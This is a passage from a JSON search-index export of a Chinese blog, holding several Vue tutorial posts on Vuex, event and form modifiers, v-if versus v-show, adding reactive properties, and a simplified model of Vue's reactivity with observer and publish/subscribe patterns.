https://github.com/vuejs/vue-next/blob/cdc9f336fd/packages/compiler-core/src/transforms/vIf.tsexport const transformIf = createStructuralDirectiveTransform(  /^(if|else|else-if)$/,  (node, dir, context) =&gt; &#123;    return processIf(node, dir, context, (ifNode, branch, isRoot) =&gt; &#123;      // ...      return () =&gt; &#123;        if (isRoot) &#123;          ifNode.codegenNode = createCodegenNodeForBranch(            branch,            key,            context          ) as IfConditionalExpression        &#125; else &#123;          // attach this branch&#x27;s codegen node to the v-if root.          const parentCondition = getParentCondition(ifNode.codegenNode!)          parentCondition.alternate = createCodegenNodeForBranch(            branch,            key + ifNode.branches.length - 1,            context          )        &#125;      &#125;    &#125;)  &#125;)\n\n四、v-show与v-if的使用场景v-if 与 v-show 都能控制dom元素在页面的显示\nv-if 相比 v-show 开销更大的（直接操作dom节点增加与删除）\n如果需要非常频繁地切换，则使用 v-show 较好\n如果在运行时条件很少改变，则使用 v-if 较好\n","categories":["框架"],"tags":["vue"]},{"title":"vue-vuex使用","url":"/2018/07/20/Vue/vue-vuex%E4%BD%BF%E7%94%A8/","content":"\n一、初始vuex1.1 vuex是什么\n\n&#96;&#96;&#96;vuex     就是把需要共享的变量全部存储在一个对象里面，然后将这个对象放在顶层组件中供其他组件使用  - 父子组件通信时，我们通常会采用 `props + emit` 这种方式。但当通信双方不是父子组件甚至压根不存在相关联系，或者一个状态需要共享给多个组件时，就会非常麻烦，数据也会相当难维护### 1.2 vuex中有什么\nconst store &#x3D; new Vuex.Store({  state: {  name: ‘weish’,  age: 22  },  getters: {  personInfo(state) {      return My name is $&#123;state.name&#125;, I am $&#123;state.age&#125;;  }  }  mutations: {  SET_AGE(state, age) {      commit(age, age);  }  },  actions: {  nameAsyn({commit}) {      setTimeout(() &#x3D;&gt; {          commit(‘SET_AGE’, 18);      }, 1000);  }  },  modules: {  a: modulesA  }}\n\n\n&gt; 个就是最基本也是完整的`vuex`代码；`vuex` 包含有五个基本的对象- `state`：存储状态。也就是变量；- `getters`：派生状态。也就是`set`、`get`中的`get`，有两个可选参数：`state`、`getters`分别可以获取`state`中的变量和其他的`getters`。外部调用方式：`store.getters.personInfo()`。就和`vue`的`computed`差不多；- `mutations`：提交状态修改。也就是`set`、`get`中的`set`，这是`vuex`中唯一修改`state`的方式，但不支持异步操作。第一个参数默认是`state`。外部调用方式：`store.commit(&#x27;SET_AGE&#x27;, 18)`。和`vue`中的`methods`类似。- `actions`：和`mutations`类似。不过`actions`支持异步操作。第一个参数默认是和`store`具有相同参数属性的对象。外部调用方式：`store.dispatch(&#x27;nameAsyn&#x27;)`。- `modules`：`store`的子模块，内容就相当于是`store`的一个实例。调用方式和前面介绍的相似，只是要加上当前子模块名，如：`store.a.getters.xxx()`### 1.3 vue-cli中使用vuex的方式**目录结构**\n├── index.html├── main.js├── components└── store    ├── index.js          # 我们组装模块并导出 store 的地方    ├── state.js          # 跟级别的 state    ├── getters.js        # 跟级别的 getter    ├── mutation-types.js # 根级别的mutations名称（官方推荐mutions方法名使用大写）    ├── mutations.js      # 根级别的 mutation    ├── actions.js        # 根级别的 action    └── modules        ├── m1.js         # 模块1        └── m2.js         # 模块2\n**state示例**\nconst state &#x3D; {    name: ‘weish’,    age: 22};\nexport default state;\n**getter示例**&gt; `getters.js`示例（我们一般使用`getters`来获取`state`的状态，而不是直接使用`state`）\nexport const name &#x3D; (state) &#x3D;&gt; {    return state.name;}\nexport const age &#x3D; (state) &#x3D;&gt; {    return state.age}\nexport const other &#x3D; (state) &#x3D;&gt; {    return My name is $&#123;state.name&#125;, I am $&#123;state.age&#125;.;}\n**mutation-type示例**&gt; 将所有`mutations`的函数名放在这个文件里\nexport const SET_NAME &#x3D; ‘SET_NAME’;export const SET_AGE &#x3D; ‘SET_AGE’;\n**mutations示例**\nimport * as types from ‘.&#x2F;mutation-type.js’;\nexport default {    [types.SET_NAME](state, name) {        state.name &#x3D; name;    },    [types.SET_AGE](state, age) {        state.age &#x3D; age;    }};\n**actions示例**&gt; 异步操作、多个`commit`时\nimport * as types from ‘.&#x2F;mutation-type.js’;\nexport default {    nameAsyn({commit}, {age, name}) {        commit(types.SET_NAME, name);        commit(types.SET_AGE, age);    }}\n**modules–m1.js示例**&gt; 如果不是很复杂的应用，一般来讲是不会分模块的\nexport default {    state: {},    getters: {},    mutations: {},    actions: {}}\n**index.js示例（组装vuex)**\nimport vue from ‘vue’;import vuex from ‘vuex’;import state from ‘.&#x2F;state.js’;import * as getters from ‘.&#x2F;getters.js’;import mutations from ‘.&#x2F;mutations.js’;import actions from ‘.&#x2F;actions.js’;import m1 from ‘.&#x2F;modules&#x2F;m1.js’;import m2 from ‘.&#x2F;modules&#x2F;m2.js’;import createLogger from ‘vuex&#x2F;dist&#x2F;logger’; &#x2F;&#x2F; 修改日志\nvue.use(vuex);\nconst debug &#x3D; process.env.NODE_ENV !&#x3D;&#x3D; ‘production’; &#x2F;&#x2F; 开发环境中为true，否则为false\nexport default new vuex.Store({    state,    getters,    mutations,    actions,    modules: {        m1,        m2    },    plugins: debug ? [createLogger()] : [] &#x2F;&#x2F; 开发环境下显示vuex的状态修改});\n&gt; 最后将`store`实例挂载到`main.js`里面的`vue`上去就行了\nimport store from ‘.&#x2F;store&#x2F;index.js’;\nnew Vue({  el: ‘#app’,  store,  render: h &#x3D;&gt; h(App)});\n&gt; 在`vue`组件中使用时，我们通常会使用`mapGetters`、`mapActions`、`mapMutations`，然后就可以按照`vue`调用`methods`和`computed`的方式去调用这些变量或函数，示例如\nimport {mapGetters, mapMutations, mapActions} from ‘vuex’;\n&#x2F;* 只写组件中的script部分 *&#x2F;export default {    computed: {        …mapGetters([            name,            age        ])    },    methods: {        …mapMutations({            setName: ‘SET_NAME’,            setAge: ‘SET_AGE’        }),        …mapActions([            nameAsyn        ])    }};\n## 二、modules&gt; 在 src 目录下 , 新建一个 store 文件夹 , 然后在里面新建一个 index.js\nimport Vue from ‘vue’import vuex from ‘vuex’Vue.use(vuex);\nexport default new vuex.Store({    state:{        show:false    }})\n&gt; 在 `main.js` 里的代码应该改成,在实例化 `Vue`对象时加入 `store` 对象\n&#x2F;&#x2F;vueximport store from ‘.&#x2F;store’\nnew Vue({  el: ‘#app’,  router,  store,&#x2F;&#x2F;使用store  template: ‘‘,  components: { App }})\n&gt; 这样就把 `store` 分离出去了 , 那么还有一个问题是 : 这里 `$store.state.show` 无论哪个组件都可以使用 , 那组件多了之后 , 状态也多了 , 这么多状态都堆在 store 文件夹下的 `index.js` 不好维护怎么办 ?- 我们可以使用 `vuex` 的 `modules` , 把 `store` 文件夹下的 `index.js` 改成\nimport Vue from ‘vue’import vuex from ‘vuex’Vue.use(vuex);\nimport dialog_store from ‘..&#x2F;components&#x2F;dialog_store.js’;&#x2F;&#x2F;引入某个store对象\nexport default new vuex.Store({    modules: {        dialog: dialog_store    }})\n&gt; 这里我们引用了一个 `dialog_store.js` , 在这个 `js`文件里我们就可以单独写 `dialog` 组件的状态了\nexport default {    state:{        show:false    }}\n&gt; 做出这样的修改之后 , 我们将之前我们使用的 `$store.state.show` 统统改为 `$store.state.dialog.show`即可- 如果还有其他的组件需要使用 `vuex` , 就新建一个对应的状态文件 , 然后将他们加入 `store`文件夹下的 `index.js`文件中的 `modules` 中\nmodules: {    dialog: dialog_store,    other: other,&#x2F;&#x2F;其他组件}\n## 三、mutations&gt; 对`vuex` 的依赖仅仅只有一个 `$store.state.dialog.show` 一个状态 , 但是如果我们要进行一个操作 , 需要依赖很多很多个状态 , 那管理起来又麻烦了- `mutations`里的操作必须是同步的\nexport default {    state:{&#x2F;&#x2F;state        show:false    },    mutations:{        switch_dialog(state){&#x2F;&#x2F;这里的state对应着上面这个state            state.show &#x3D; state.show?false:true;            &#x2F;&#x2F;你还可以在这里执行其他的操作改变state        }    }}\n&gt; 使用 `mutations` 后 , 原先我们的父组件可以改为\n\n  \n    点击\n    \n  \n\n\n\nimport dialog from './components/dialog.vue'\nexport default {\n  components:{\n    \"t-dialog\":dialog\n  }\n}\n\n&gt; 使用 `$store.commit(&#x27;switch_dialog&#x27;)` 来触发 `mutations` 中的 `switch_dialog` 方法## 四、actions&gt; 多个 `state` 的操作 , 使用 `mutations`会来触发会比较好维护 , 那么需要执行多个 `mutations` 就需要用 `action` 了\nexport default {    state:{&#x2F;&#x2F;state        show:false    },    mutations:{        switch_dialog(state){&#x2F;&#x2F;这里的state对应着上面这个state            state.show &#x3D; state.show?false:true;            &#x2F;&#x2F;你还可以在这里执行其他的操作改变state        }    },    actions:{        switch_dialog(context){&#x2F;&#x2F;这里的context和我们使用的$store拥有相同的对象和方法            context.commit(‘switch_dialog’);            &#x2F;&#x2F;你还可以在这里触发其他的mutations方法        },    }}\n&gt; 那么 , 在之前的父组件中 , 我们需要做修改 , 来触发 `action` 里的 `switch_dialog` 方法\n\n  \n    点击\n    \n  \n\n\n\nimport dialog from './components/dialog.vue'\nexport default {\n  components:{\n    \"t-dialog\":dialog\n  }\n}\n\n- 使用 `$store.dispatch(&#x27;switch_dialog&#x27;)` 来触发 `action` 中的 `switch_dialog` 方法。- 官方推荐 , 将异步操作放在 `action`中## 五、getters&gt; `getters`和 `vue` 中的`computed` 类似 , 都是用来计算 `state` 然后生成新的数据 ( 状态 ) 的- 假如我们需要一个与状态 `show` 刚好相反的状态 , 使用 `vue` 中的 `computed` 可以这样算出来\ncomputed(){    not_show(){        return !this.$store.state.dialog.show;    }}\n&gt; 那么 , 如果很多很多个组件中都需要用到这个与 `show`刚好相反的状态 , 那么我们需要写很多很多个 `not_show`, 使用 `getters`就可以解决这种问题\nexport default {    state:{&#x2F;&#x2F;state        show:false    },    getters:{        not_show(state){&#x2F;&#x2F;这里的state对应着上面这个state            return !state.show;        }    },    mutations:{        switch_dialog(state){&#x2F;&#x2F;这里的state对应着上面这个state            state.show &#x3D; state.show?false:true;            &#x2F;&#x2F;你还可以在这里执行其他的操作改变state        }    },    actions:{        switch_dialog(context){&#x2F;&#x2F;这里的context和我们使用的$store拥有相同的对象和方法            context.commit(‘switch_dialog’);            &#x2F;&#x2F;你还可以在这里触发其他的mutations方法        },    }}\n&gt; 我们在组件中使用 `$store.state.dialog.show` 来获得状态 `show` , 类似的 , 我们可以使用 `$store.getters.not_show` 来获得状态 `not_show`- 注意 : `$store.getters.not_show` 的值是不能直接修改的 , 需要对应的 `state` 发生变化才能修改## 六、mapState、mapGetters、mapActions&gt; 很多时候 , `$store.state.dialog.show` 、`$store.dispatch(&#x27;switch_dialog&#x27;)` 这种写法很不方便- 使用 `mapState`、`mapGetters`、`mapActions` 就不会这么复杂了\n\n  \n\n\n\nimport {mapState} from 'vuex';\nexport default {\n  computed:{\n\n    //这里的三点叫做 : 扩展运算符\n    ...mapState({\n      show:state=>state.dialog.show\n    }),\n  }\n}\n\n相当于\n\n  \n\n\n\nimport {mapState} from 'vuex';\nexport default {\n  computed:{\n    show(){\n        return this.$store.state.dialog.show;\n    }\n  }\n}\n\n&#96;&#96;&#96;\n\nmapGetters、mapActions 和 mapState 类似 , mapGetters 一般也写在 computed 中 , mapActions 一般写在 methods 中\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-事件","url":"/2018/08/17/Vue/vue-%E4%BA%8B%E4%BB%B6/","content":"一、方法传参&lt;div id=&quot;test&quot;&gt;    &lt;button @click=&quot;sayHi(&#x27;你好&#x27;)&quot;&gt;说你好&lt;/button&gt; &lt;!--这里使用@--&gt;    &lt;button @click=&quot;sayHi(&#x27;我被点击了&#x27;)&quot;&gt;说我被点击了&lt;/button&gt; &lt;!--这里使用@--&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var myVue = new Vue(&#123;        el: &#x27;#test&#x27;,        methods: &#123;      //这里使用methods            sayHi: function (message) &#123;                alert(message)            &#125;        &#125;    &#125;)&lt;/script&gt;\n\n二、vue访问原生 DOM 事件\n用$event获取\n\n&lt;button @click=&quot;changeColor(&#x27;你好&#x27;,$event)&quot;&gt;点击我&lt;/button&gt; &lt;!--这里使用@--&gt;&lt;div style=&quot;height: 100px;width: 100px;background-color: red;&quot; @mouseover=&quot;over(&#x27;鼠标从我上面滑过&#x27;,$event)&quot;&gt;    鼠标从我上面滑过试试&lt;/div&gt;                       &lt;script type=&quot;text/javascript&quot;&gt;    var myVue = new Vue(&#123;        el: &#x27;#test&#x27;,        methods: &#123;      //这里使用methods            changeColor: function (message, event) &#123;                alert(message+event);    //弹出我被点击了,事件是[object MouseEvent]            &#125;,            over :function (message, event) &#123;                alert(message+event);   //弹出鼠标从我上面滑过,事件是[object MouseEvent]            &#125;        &#125;    &#125;)&lt;/script&gt;\n\n三、事件修饰符\n事件修饰符有基本的6种\n\n.stop阻止事件冒泡\n&lt;a v-on:click.stop=&quot;doThis&quot;&gt;&lt;/a&gt;\n\n.prevent阻止默认事件\n&lt;form v-on:submit.prevent=&quot;onSubmit&quot;&gt;&lt;/form&gt;\n\n.capture时间捕获（从上到下）\n&lt;div v-on:click.capture=&quot;doThis&quot;&gt;...&lt;/div&gt;\n\n.self只在元素自身回调\n&lt;div v-on:click.self=&quot;doThat&quot;&gt;...&lt;/div&gt;\n\n.once只触发一次\n&lt;a v-on:click.once=&quot;doThis&quot;&gt;&lt;/a&gt;\n\n\n使用修饰符时，顺序很重要；相应的代码会以同样的顺序产生。因此，用 [@click.prevent.self](mailto:@click.prevent.self)会阻止所有的点击，而@click.self.prevent&#96; 只会阻止元素上的点击\n\n四、键值修饰符\n在监听键盘事件时，我们经常需要监测常见的键值。 Vue 允许为 v-on 在监听键盘事件时添加关键修饰符\n\n&lt;div id=&quot;app&quot;&gt;    &#123;&#123;msg&#125;&#125;    &lt;input type=&quot;text&quot; v-on:keydown=&quot;ke&quot;/&gt;&lt;/div&gt;&lt;script&gt;var app = new Vue(&#123;        el:&quot;#app&quot;,        data:&#123;            msg:&quot;事件处理&quot;,            counter:0        &#125;,        methods:&#123;            ke:function(e)&#123;                if(e.keyCode == 13)&#123;                    this.msg = e.target.value;                    e.target.value = &quot;&quot;;                &#125;            &#125;        &#125;&#125;);&lt;/script&gt;\n\n\nenter(回车)\ntab（tab切换）\ndelete (捕获 “删除” 和 “退格” 键)\nesc（esc键）\nspace（退档键）\nup（上键）\ndown（下键）\nleft（左键）\nright（右键）\n\n\n我们也可以通过全局config.keyCodes 对象自定义键值修饰符别名\n\nVue.config.keyCodes.f1 = 112","categories":["框架"],"tags":["vue"]},{"title":"vue-修饰符","url":"/2018/09/02/Vue/vue-%E4%BF%AE%E9%A5%B0%E7%AC%A6/","content":"一、修饰符是什么在程序世界里，修饰符是用于限定类型以及类型成员的声明的一种符号\n在Vue中，修饰符处理了许多DOM事件的细节，让我们不再需要花大量的时间去处理这些烦恼的事情，而能有更多的精力专注于程序的逻辑处理\nvue中修饰符分为以下五种：\n\n表单修饰符\n事件修饰符\n鼠标按键修饰符\n键值修饰符\nv-bind修饰符\n\n二、修饰符的作用表单修饰符在我们填写表单的时候用得最多的是input标签，指令用得最多的是v-model\n关于表单的修饰符有如下：\n\nlazy\ntrim\nnumber\n\nlazy在我们填完信息，光标离开标签的时候，才会将值赋予给value，也就是在change事件之后再进行信息同步\n&lt;input type=&quot;text&quot; v-model.lazy=&quot;value&quot;&gt;&lt;p&gt;&#123;&#123;value&#125;&#125;&lt;/p&gt;\n\ntrim自动过滤用户输入的首空格字符，而中间的空格不会过滤\n&lt;input type=&quot;text&quot; v-model.trim=&quot;value&quot;&gt;\n\n\n\nnumber自动将用户的输入值转为数值类型，但如果这个值无法被parseFloat解析，则会返回原来的值\n&lt;input v-model.number=&quot;age&quot; type=&quot;number&quot;&gt;\n\n事件修饰符事件修饰符是对事件捕获以及目标进行了处理，有如下修饰符：\n\nstop\nprevent\nself\nonce\ncapture\npassive\nnative\n\nstop阻止了事件冒泡，相当于调用了event.stopPropagation方法\n&lt;div @click=&quot;shout(2)&quot;&gt;  &lt;button @click.stop=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;&lt;/div&gt;//只输出1\n\nprevent阻止了事件的默认行为，相当于调用了event.preventDefault方法\n&lt;form v-on:submit.prevent=&quot;onSubmit&quot;&gt;&lt;/form&gt;\n\nself只当在 event.target 是当前元素自身时触发处理函数\n&lt;div v-on:click.self=&quot;doThat&quot;&gt;...&lt;/div&gt;\n\n\n使用修饰符时，顺序很重要；相应的代码会以同样的顺序产生。因此，用 v-on:click.prevent.self会阻止所有的点击，而 v-on:click.self.prevent 只会阻止对元素自身的点击\n\nonce绑定了事件以后只能触发一次，第二次就不会触发\n&lt;button @click.once=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;\n\ncapture使事件触发从包含这个元素的顶层开始往下触发\n&lt;div @click.capture=&quot;shout(1)&quot;&gt;    obj1&lt;div @click.capture=&quot;shout(2)&quot;&gt;    obj2&lt;div @click=&quot;shout(3)&quot;&gt;    obj3&lt;div @click=&quot;shout(4)&quot;&gt;    obj4&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;// 输出结构: 1 2 4 3 \n\npassive在移动端，当我们在监听元素滚动事件的时候，会一直触发onscroll事件会让我们的网页变卡，因此我们使用这个修饰符的时候，相当于给onscroll事件整了一个.lazy修饰符\n&lt;!-- 滚动事件的默认行为 (即滚动行为) 将会立即触发 --&gt;&lt;!-- 而不会等待 `onScroll` 完成  --&gt;&lt;!-- 这其中包含 `event.preventDefault()` 的情况 --&gt;&lt;div v-on:scroll.passive=&quot;onScroll&quot;&gt;...&lt;/div&gt;\n\n\n不要把 .passive 和 .prevent 一起使用,因为 .prevent 将会被忽略，同时浏览器可能会向你展示一个警告。\npassive 会告诉浏览器你不想阻止事件的默认行为\n\nnative让组件变成像html内置标签那样监听根元素的原生事件，否则组件上使用 v-on 只会监听自定义事件\n&lt;my-component v-on:click.native=&quot;doSomething&quot;&gt;&lt;/my-component&gt;\n\n\n使用.native修饰符来操作普通HTML标签是会令事件失效的\n\n鼠标按钮修饰符鼠标按钮修饰符针对的就是左键、右键、中键点击，有如下：\n\nleft 左键点击\nright 右键点击\nmiddle 中键点击\n\n&lt;button @click.left=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;&lt;button @click.right=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;&lt;button @click.middle=&quot;shout(1)&quot;&gt;ok&lt;/button&gt;\n\n键盘修饰符键盘修饰符是用来修饰键盘事件（onkeyup，onkeydown）的，有如下：\nkeyCode存在很多，但vue为我们提供了别名，分为以下两种：\n\n普通键（enter、tab、delete、space、esc、up…）\n系统修饰键（ctrl、alt、meta、shift…）\n\n// 只有按键为keyCode的时候才触发&lt;input type=&quot;text&quot; @keyup.keyCode=&quot;shout()&quot;&gt;\n\n还可以通过以下方式自定义一些全局的键盘码别名\nVue.config.keyCodes.f2 = 113\n\nv-bind修饰符v-bind修饰符主要是为属性进行操作，用来分别有如下：\n\nasync\nprop\ncamel\n\nasync能对props进行一个双向绑定\n//父组件&lt;comp :myMessage.sync=&quot;bar&quot;&gt;&lt;/comp&gt; //子组件this.$emit(&#x27;update:myMessage&#x27;,params);\n\n以上这种方法相当于以下的简写\n//父亲组件&lt;comp :myMessage=&quot;bar&quot; @update:myMessage=&quot;func&quot;&gt;&lt;/comp&gt;func(e)&#123; this.bar = e;&#125;//子组件jsfunc2()&#123;  this.$emit(&#x27;update:myMessage&#x27;,params);&#125;\n\n使用async需要注意以下两点：\n\n使用sync的时候，子组件传递的事件名格式必须为update:value，其中value必须与子组件中props中声明的名称完全一致\n注意带有 .sync 修饰符的 v-bind 不能和表达式一起使用\n将 v-bind.sync 用在一个字面量的对象上，例如 v-bind.sync=”&#123; title: doc.title &#125;”，是无法正常工作的\n\nprops设置自定义标签属性，避免暴露数据，防止污染HTML结构\n&lt;input id=&quot;uid&quot; title=&quot;title1&quot; value=&quot;1&quot; :index.prop=&quot;index&quot;&gt;\n\ncamel将命名变为驼峰命名法，如将view-Box属性名转换为 viewBox\n&lt;svg :viewBox=&quot;viewBox&quot;&gt;&lt;/svg&gt;\n\n三、应用场景根据每一个修饰符的功能，我们可以得到以下修饰符的应用场景：\n\n.stop：阻止事件冒泡\n.native：绑定原生事件\n.once：事件只执行一次\n.self ：将事件绑定在自身身上，相当于阻止事件冒泡\n.prevent：阻止默认事件\n.caption：用于事件捕获\n.once：只触发一次\n.keyCode：监听特定键盘按下\n.right：右键\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-响应式-对象问题","url":"/2018/08/21/Vue/vue-%E5%93%8D%E5%BA%94%E5%BC%8F-%E5%AF%B9%E8%B1%A1%E9%97%AE%E9%A2%98/","content":"一、直接添加属性的问题我们从一个例子开始\n定义一个p标签，通过v-for指令进行遍历\n然后给botton标签绑定点击事件，我们预期点击按钮时，数据新增一个属性，界面也 新增一行\n&lt;p v-for=&quot;(value,key) in item&quot; :key=&quot;key&quot;&gt;    &#123;&#123; value &#125;&#125;&lt;/p&gt;&lt;button @click=&quot;addProperty&quot;&gt;动态添加新属性&lt;/button&gt;\n\n实例化一个vue实例，定义data属性和methods方法\nconst app = new Vue(&#123;    el:&quot;#app&quot;,   \tdata:()=&gt;&#123;       \titem:&#123;            oldProperty:&quot;旧属性&quot;        &#125;    &#125;,    methods:&#123;        addProperty()&#123;            this.items.newProperty = &quot;新属性&quot;  // 为items添加新属性            console.log(this.items)  // 输出带有newProperty的items        &#125;    &#125;&#125;)\n\n点击按钮，发现结果不及预期，数据虽然更新了（console打印出了新属性），但页面并没有更新\n二、原理分析为什么产生上面的情况呢？\n下面来分析一下\nvue2是用过Object.defineProperty实现数据响应式\nconst obj = &#123;&#125;Object.defineProperty(obj, &#x27;foo&#x27;, &#123;        get() &#123;            console.log(`get foo:$&#123;val&#125;`);            return val        &#125;,        set(newVal) &#123;            if (newVal !== val) &#123;                console.log(`set foo:$&#123;newVal&#125;`);                val = newVal            &#125;        &#125;    &#125;)&#125;\n\n当我们访问foo属性或者设置foo值的时候都能够触发setter与getter\nobj.foo   obj.foo = &#x27;new&#x27;\n\n但是我们为obj添加新属性的时候，却无法触发事件属性的拦截\nobj.bar  = &#x27;新属性&#x27;\n\n原因是一开始obj的foo属性被设成了响应式数据，而bar是后面新增的属性，并没有通过Object.defineProperty设置成响应式数据\n三、解决方案Vue 不允许在已经创建的实例上动态添加新的响应式属性\n若想实现数据与视图同步更新，可采取下面三种解决方案：\n\nVue.set()\nObject.assign()\n$forcecUpdated()\n\nVue.set()Vue.set( target, propertyName&#x2F;index, value )\n参数\n\n&#123;Object | Array&#125; target\n&#123;string | number&#125; propertyName/index\n&#123;any&#125; value\n\n返回值：设置的值\n通过Vue.set向响应式对象中添加一个property，并确保这个新 property同样是响应式的，且触发视图更新\n关于Vue.set源码（省略了很多与本节不相关的代码）\n源码位置：src\\core\\observer\\index.js\nfunction set (target: Array&lt;any&gt; | Object, key: any, val: any): any &#123;  ...  defineReactive(ob.value, key, val)  ob.dep.notify()  return val&#125;\n\n这里无非再次调用defineReactive方法，实现新增属性的响应式\n关于defineReactive方法，内部还是通过Object.defineProperty实现属性拦截\n大致代码如下：\nfunction defineReactive(obj, key, val) &#123;    Object.defineProperty(obj, key, &#123;        get() &#123;            console.log(`get $&#123;key&#125;:$&#123;val&#125;`);            return val        &#125;,        set(newVal) &#123;            if (newVal !== val) &#123;                console.log(`set $&#123;key&#125;:$&#123;newVal&#125;`);                val = newVal            &#125;        &#125;    &#125;)&#125;\n\nObject.assign()直接使用Object.assign()添加到对象的新属性不会触发更新\n应创建一个新的对象，合并原对象和混入对象的属性\nthis.someObject = Object.assign(&#123;&#125;,this.someObject,&#123;newProperty1:1,newProperty2:2 ...&#125;)\n\n1\n$forceUpdate如果你发现你自己需要在 Vue中做一次强制更新，99.9% 的情况，是你在某个地方做错了事\n$forceUpdate迫使Vue 实例重新渲染\nPS：仅仅影响实例本身和插入插槽内容的子组件，而不是所有子组件。\n小结\n如果为对象添加少量的新属性，可以直接采用Vue.set()\n如果需要为新对象添加大量的新属性，则通过Object.assign()创建新对象\n如果你实在不知道怎么操作时，可采取$forceUpdate()进行强制刷新 (不建议)\n\nPS：vue3是用过proxy实现数据响应式的，直接动态添加新属性仍可以实现数据响应式\n","categories":["框架"],"tags":["vue"]},{"title":"vue-响应式原理","url":"/2018/08/30/Vue/vue-%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86/","content":"数据驱动\n数据响应式、双向绑定、数据驱动\n\n数据响应式\n\n数据模型仅仅是普通的 JavaScript 对象，而当我们修改数据时，视图会进行更新，避免了繁琐的 DOM 操作提高开发效率\n\n\n双向绑定\n\n数据改变，视图改变;视图改变，数据也随之改变\n我们可以使用 v-model 在表单元素上创建双向数据绑定\n\n\n数据驱动是\nVue\n\n最独特的特性之一\n\n开发过程中仅需要关注数据本身，不需要关心数据是如何渲染到视图\n\n\n\n数据响应式的核心原理Vue 2.x\n浏览器兼容 IE8 以上(不兼容 IE8)\n\n// 模拟 Vue 中的 data 选项 let data = &#123;    msg: &#x27;hello&#x27;&#125;// 模拟 Vue 的实例 let vm = &#123;&#125;// 数据劫持:当访问或者设置 vm 中的成员的时候，做一些干预操作Object.defineProperty(vm, &#x27;msg&#x27;, &#123;  // 可枚举(可遍历)  enumerable: true,  // 可配置(可以使用 delete 删除，可以通过 defineProperty 重新定义)   configurable: true,  // 当获取值的时候执行   get () &#123;    console.log(&#x27;get: &#x27;, data.msg)    return data.msg   &#125;,  // 当设置值的时候执行   set (newValue) &#123;    console.log(&#x27;set: &#x27;, newValue)     if (newValue === data.msg) &#123;      return    &#125;    data.msg = newValue    // 数据更改，更新 DOM 的值     document.querySelector(&#x27;#app&#x27;).textContent = data.msg  &#125; &#125;)// 测试vm.msg = &#x27;Hello World&#x27; console.log(vm.msg)\n\n\n如果有一个对象中多个属性需要转换 getter/setter 如何处理?\n\nVue 3.x\n直接监听对象，而非属性\nES 6中新增，IE 不支持，性能由浏览器优化\n\n// 模拟 Vue 中的 data 选项 let data = &#123;  msg: &#x27;hello&#x27;,  count: 0 &#125;// 模拟 Vue 实例let vm = new Proxy(data, &#123;  // 当访问 vm 的成员会执行  get (target, key) &#123;    console.log(&#x27;get, key: &#x27;, key, target[key])    return target[key]  &#125;,  // 当设置 vm 的成员会执行  set (target, key, newValue) &#123;    console.log(&#x27;set, key: &#x27;, key, newValue)    if (target[key] === newValue) &#123;      return    &#125;    target[key] = newValue    document.querySelector(&#x27;#app&#x27;).textContent = target[key]  &#125;&#125;)// 测试vm.msg = &#x27;Hello World&#x27;console.log(vm.msg)\n\n发布订阅模式和观察者模式发布&#x2F;订阅模式\n发布&#x2F;订阅模式\n订阅者\n发布者\n信号中心\n\n\n\n\n我们假定，存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”(publish)一个信 号，其他任务可以向信号中心”订阅”(subscribe)这个信号，从而知道什么时候自己可以开始执 行。这就叫做”发布&#x2F;订阅模式”(publish-subscribe pattern)\n\nVue 的自定义事件\nlet vm = new Vue()vm.$on(&#x27;dataChange&#x27;, () =&gt; &#123; console.log(&#x27;dataChange&#x27;)&#125;)vm.$on(&#x27;dataChange&#x27;, () =&gt; &#123;   console.log(&#x27;dataChange1&#x27;)&#125;) vm.$emit(&#x27;dataChange&#x27;)\n\n兄弟组件通信过程\n// eventBus.js// 事件中心let eventHub = new Vue()// ComponentA.vue// 发布者addTodo: function () &#123;  // 发布消息(事件)  eventHub.$emit(&#x27;add-todo&#x27;, &#123; text: this.newTodoText &#125;)   this.newTodoText = &#x27;&#x27;&#125;// ComponentB.vue// 订阅者created: function () &#123;  // 订阅消息(事件)  eventHub.$on(&#x27;add-todo&#x27;, this.addTodo)&#125;\n\n\n模拟 Vue 自定义事件的实现\n\nclass EventEmitter &#123;  constructor()&#123;    // &#123; eventType: [ handler1, handler2 ] &#125;    this.subs = &#123;&#125;  &#125;  // 订阅通知  $on(eventType, fn) &#123;    this.subs[eventType] = this.subs[eventType] || []    this.subs[eventType].push(fn)  &#125;  // 发布通知  $emit(eventType) &#123;    if(this.subs[eventType]) &#123;      this.subs[eventType].forEach(v=&gt;v())    &#125;  &#125;&#125;// 测试var bus = new EventEmitter()// 注册事件bus.$on(&#x27;click&#x27;, function () &#123;  console.log(&#x27;click&#x27;)&#125;)bus.$on(&#x27;click&#x27;, function () &#123;  console.log(&#x27;click1&#x27;)&#125;)// 触发事件 bus.$emit(&#x27;click&#x27;)\n\n观察者模式\n观察者(订阅者) –\nWatcher\n\n\nupdate():当事件发生时，具体要做的事情\n\n\n目标(发布者) –\nDep\n\n\nsubs 数组:存储所有的观察者\naddSub():添加观察者\nnotify():当事件发生，调用所有观察者的 update() 方法\n\n\n没有事件中心\n\n\n// 目标(发布者) // Dependencyclass Dep &#123;  constructor () &#123;    // 存储所有的观察者    this.subs = []  &#125;  // 添加观察者  addSub (sub) &#123;    if (sub &amp;&amp; sub.update) &#123;      this.subs.push(sub)    &#125;  &#125;  // 通知所有观察者  notify () &#123;    this.subs.forEach(sub =&gt; sub.update())  &#125;&#125;// 观察者(订阅者)class Watcher &#123;  update () &#123;    console.log(&#x27;update&#x27;)  &#125;&#125;// 测试let dep = new Dep()let watcher = new Watcher()dep.addSub(watcher) dep.notify()\n\n总结\n观察者模式是由具体目标调度，比如当事件触发，Dep 就会去调用观察者的方法，所以观察者模式的订阅者与发布者之间是存在依赖的\n发布&#x2F;订阅模式由统一调度中心调用，因此发布者和订阅者不需要知道对方的存在\n\n\nVue 响应式原理模拟整体分析\nVue 基本结构\n打印 Vue 实例观察\n整体结构\n\n\n\nVue: 把 data 中的成员注入到 Vue 实例，并且把 data 中的成员转成 getter/setter\nObserver：能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知 